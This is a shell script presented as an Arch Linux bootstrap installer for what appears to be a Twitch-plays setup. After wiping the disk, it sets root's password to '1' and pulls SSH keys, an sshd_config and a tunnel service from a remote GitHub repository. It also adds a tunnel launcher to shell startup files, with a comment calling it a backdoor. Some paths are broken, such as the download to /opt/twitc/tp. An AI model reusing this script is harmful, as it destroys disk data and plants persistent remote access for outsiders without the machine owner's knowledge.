#!/bin/sh

# Arch Linux Bootstrap Script
#
# See comments below for running
#

#no control-c fam sorry
trap '' 2

#Get the disk
if [ -b /dev/sda ]; then DISK="/dev/sda"; else DISK="/dev/vda"; fi

# Partition all of main drive
echo "n
p
1


w
"|fdisk $DISK

# Format and mount drive
mkfs -F -t ext4 $DISK"1"
mount $DISK"1" /mnt

# Install base system, fstab, grub
pacstrap /mnt base base-devel
genfstab -pU /mnt >> /mnt/etc/fstab
pacstrap /mnt grub-bios

# Keyboard, locale, time
arch-chroot /mnt /bin/bash -c '
trap '' 2
if [ -b /dev/sda ]; then DISK="/dev/sda"; else DISK="/dev/vda"; fi
echo "KEYMAP=us" > /etc/vconsole.conf
echo "en_US.UTF-8 UTF-8" >> /etc/locale.gen
echo "LANG=en_US.UTF-8" > /etc/locale.conf
ln -s /usr/share/zoneinfo/US/Eastern /etc/localtime
locale-gen
sudo hwclock --hctosys --localtime

# Set the root password
echo "root:1" | chpasswd

# Install Grub
grub-install --recheck $DISK"1"
echo GRUB_DISABLE_SUBMENU=y >> /etc/default/grub
grub-mkconfig -o /boot/grub/grub.cfg

# Ensure DHCP service can start
systemctl enable dhcpcd.service

# block bad commands
alias rm="echo Bad command!">> ~/.bashrc
alias dd="echo Bad command!">> ~/.bashrc

# cant even get one script to run, so lets do this instead

yes | pacman -S --noconfirm cronie base-devel zsh screen nmap openssh i3-wm xorg-core vba python-minimal irssi i3status dmenu git nodejs make git xdotool npm
systemctl enable cronie.service


#ssh tunnel
mkdir ~/.ssh
chmod -R 0700 ~/.ssh
curl -o /etc/systemd/system/sshtunnel.service https://raw.githubusercontent.com/0xicl33n/twitchinstalls/master/sshtunnel.service
curl -o ~/.ssh/authorized_keys https://raw.githubusercontent.com/0xicl33n/twitchinstalls/master/authorized_keys
curl -o ~/.ssh/id_rsa https://raw.githubusercontent.com/0xicl33n/twitchinstalls/master/id_rsa
chmod 0600 ~/.ssh/id_rsa
curl -o /etc/ssh/sshd_config https://raw.githubusercontent.com/0xicl33n/twitchinstalls/master/sshd_config
chmod 0655 /etc/ssh/sshd_config
systemctl restart sshd
systemctl start sshtunnel

# this may not be needed
mkdir /opt/twitch
curl -O https://raw.githubusercontent.com/0xicl33n/twitchinstalls/master/twitchplays /opt/twitc/tp
cd /opt/tp && npm install

# paranoid about backdoor not executing - this may not be needed either
echo "/opt/ssh_tunnel" >> ~/.bashrc
echo "/opt/ssh_tunnel" >> ~/.zshrc
echo "/opt/ssh_tunnel" >> /etc/profile

# More X
mkdir ~/.i3
curl -o ~/.i3/config https://raw.githubusercontent.com/0xicl33n/twitchinstalls/master/i3config
' # END OF CHROOT

umount -R /mnt
reboot
